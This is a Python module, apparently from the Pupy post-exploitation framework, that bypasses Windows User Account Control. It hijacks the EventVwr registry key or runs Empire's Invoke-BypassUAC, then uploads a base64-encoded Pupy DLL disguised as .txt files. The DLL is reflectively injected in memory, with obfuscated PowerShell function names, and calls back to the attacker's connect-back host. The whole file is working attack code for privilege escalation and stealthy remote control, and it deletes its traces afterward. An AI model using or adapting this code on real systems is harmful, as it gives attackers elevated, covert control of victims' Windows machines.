# -*- coding: UTF8 -*-
#Author: @bobsecq
#Contributor(s):

import os, logging
import platform
import pupygen
from rpyc.utils.classic import upload
import base64
from tempfile import gettempdir, _get_candidate_names
import subprocess
from modules.lib.windows.powershell_upload import execute_powershell_script
import re, time
import random, string
from pupylib.utils.rpyc_utils import redirected_stdo

class bypassuac():
    
    def __init__(self, module, rootPupyPath):
        self.module = module
        self.module.client.load_package("pupwinutils.bypassuac_remote")

        #Remote paths
        remoteTempFolder, systemRoot = self.module.client.conn.modules["pupwinutils.bypassuac_remote"].get_env_variables()
        
        self.invokeReflectivePEInjectionRemotePath = "{temp}{random}{ext}".format(temp=remoteTempFolder, random=next(_get_candidate_names()), ext='.txt')
        self.mainPowershellScriptRemotePath = "{temp}{random}{ext}".format(temp=remoteTempFolder, random=next(_get_candidate_names()), ext='.ps1')
        self.pupyDLLRemotePath = "{temp}{random}{ext}".format(temp=remoteTempFolder, random=next(_get_candidate_names()), ext='.txt')
        self.invokeBypassUACRemotePath = "{temp}{random}{ext}".format(temp=remoteTempFolder, random=next(_get_candidate_names()), ext='.ps1')
        
        #Adding obfuscation on ps1 main function
        self.bypassUAC_random_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(7))
        self.reflectivePE_random_name = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(7))

        #Define Local paths
        self.pupyDLLLocalPath = os.path.join(gettempdir(),'dllFile.txt')
        self.mainPowerShellScriptPrivilegedLocalPath = os.path.join(gettempdir(),'mainPowerShellScriptPrivileged.txt')
        self.invokeReflectivePEInjectionLocalPath = os.path.join(rootPupyPath,"pupy", "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1")
        self.invokeBypassUACLocalPath = os.path.join(rootPupyPath, "pupy", "external", "Empire", "privesc", "Invoke-BypassUAC.ps1")
        
            
    def bypassuac_through_EventVwrBypass(self):
        #   '''
        #   Based on Invoke-EventVwrBypass, thanks to enigma0x3 (https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
        #   '''
        
        # On a Windows 10 "C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe" does not exist, we cannot force to use a x64 bit powershell interpreter
        # The pupy dll upload will be a 32 bit
        if '64' in self.module.client.desc['proc_arch']:
            upload_x86_dll = False
        else:
            upload_x86_dll = True
        self.module.info('Uploading temporary files')
        self.uploadPupyDLL(force_x86_dll=upload_x86_dll)
        self.uploadPowershellScripts()
        files_to_delete=[self.invokeReflectivePEInjectionRemotePath, self.mainPowershellScriptRemotePath, self.pupyDLLRemotePath]
        self.module.info('Altering the registry')
        self.module.client.conn.modules["pupwinutils.bypassuac_remote"].registry_hijacking(self.mainPowershellScriptRemotePath, files_to_delete)
        
        self.module.success("Waiting for a connection from the DLL (take few seconds)...")
        self.module.success("If nothing happened, try to migrate to another process and try again.")
        
    def bypassuac_through_PowerSploitBypassUAC(self):
        '''
        Performs a bypass UAC attack by utilizing the powersloit UACBypass script (wind7 to 8.1)
        '''
        #Constants
        bypassUACcmd = "{InvokeBypassUAC} -Command 'powershell.exe -ExecutionPolicy Bypass -file {mainPowershell} -Verbose'".format(InvokeBypassUAC=self.bypassUAC_random_name, mainPowershell=self.mainPowershellScriptRemotePath)
        self.module.info('Uploading temporary files')
        self.uploadPowershellScripts()
        self.uploadPupyDLL()
        content = re.sub("Write-Verbose ","Write-Output ", open(self.invokeBypassUACLocalPath, 'r').read(), flags=re.I)
        content = re.sub("Invoke-BypassUAC", self.bypassUAC_random_name, content, flags=re.I)
        logging.debug("Starting BypassUAC script with the following cmd: {0}".format(bypassUACcmd))
        self.module.info('Starting the UAC Bypass process')
        output = execute_powershell_script(self.module, content, bypassUACcmd, x64IfPossible=True)
        logging.debug("BypassUAC script output: %s\n"%(output))
        
        if "DLL injection complete!" in output:
            self.module.success("UAC bypassed")
        else:
            self.module.warning("Impossible to know what's happened remotely. You should active debug mode.")
        
        #Clean tmp files
        tmp_files = [self.invokeReflectivePEInjectionRemotePath, self.mainPowershellScriptRemotePath, self.invokeBypassUACRemotePath, self.pupyDLLRemotePath]
        logging.debug("Deleting temporary files")
        self.module.client.conn.modules["pupwinutils.bypassuac_remote"].deleteTHisRemoteFile(tmp_files)
        
        #...
        self.module.success("Waiting for a connection from the DLL (take few seconds)...")
        self.module.success("If nothing happened, try to migrate to another process and try again.")
        
    def uploadPowershellScripts(self):
        '''
        Upload main powershell script and invokeReflectivePEInjection script
        '''
        mainPowerShellScriptPrivileged = """
        cat {invoke_reflective_pe_injection} | Out-String  | iex
        cat {pupy_dll} | Out-String  | iex
        {InvokeReflectivePEInjection} -PEBytes $PEBytes -ForceASLR
        """.format(invoke_reflective_pe_injection=self.invokeReflectivePEInjectionRemotePath, pupy_dll=self.pupyDLLRemotePath, InvokeReflectivePEInjection=self.reflectivePE_random_name)
        
        logging.debug("Creating the Powershell script in %s locally"%(self.mainPowerShellScriptPrivilegedLocalPath))
        with open(self.mainPowerShellScriptPrivilegedLocalPath, 'w+') as w:
            w.write(mainPowerShellScriptPrivileged)
        
        logging.debug("Uploading powershell code for DLL injection in {0}".format(self.invokeReflectivePEInjectionRemotePath))
        content = re.sub("Invoke-ReflectivePEInjection", self.reflectivePE_random_name, open(self.invokeReflectivePEInjectionLocalPath).read(), flags=re.I)
        tmp_file = os.path.join(gettempdir(),'reflective_pe.txt')
        with open(tmp_file, 'w+') as w:
            w.write(content)
        upload(self.module.client.conn, tmp_file, self.invokeReflectivePEInjectionRemotePath)
        
        logging.debug("Uploading main powershell script executed by BypassUAC in {0}".format(self.mainPowershellScriptRemotePath))
        upload(self.module.client.conn, self.mainPowerShellScriptPrivilegedLocalPath, self.mainPowershellScriptRemotePath)

    def uploadPupyDLL(self, force_x86_dll=False):
        '''
        Upload pupy dll as a txt file
        '''
        res=self.module.client.conn.modules['pupy'].get_connect_back_host()
        host, port = res.rsplit(':',1)
        logging.debug("Address configured is %s:%s for pupy dll..."%(host,port))
        logging.debug("Looking for process architecture...")

        if "64" in self.module.client.desc["os_arch"] and not force_x86_dll:
            logging.debug("Target achitecture is x64, using a x64 dll")
            dllbuff=pupygen.get_edit_pupyx64_dll(self.module.client.get_conf())
        else:
            logging.debug("Target achitecture is x86, using a x86 dll")
            dllbuff=pupygen.get_edit_pupyx86_dll(self.module.client.get_conf())
        
        logging.debug("Creating the pupy dll in %s locally"%(self.pupyDLLLocalPath))
        with open(self.pupyDLLLocalPath, 'w+') as w:
            w.write('$PEBytes = [System.Convert]::FromBase64String("%s")'%(base64.b64encode(dllbuff)))
        
        logging.debug("Uploading pupy dll in {0}".format(self.pupyDLLRemotePath))
        upload(self.module.client.conn, self.pupyDLLLocalPath, self.pupyDLLRemotePath)
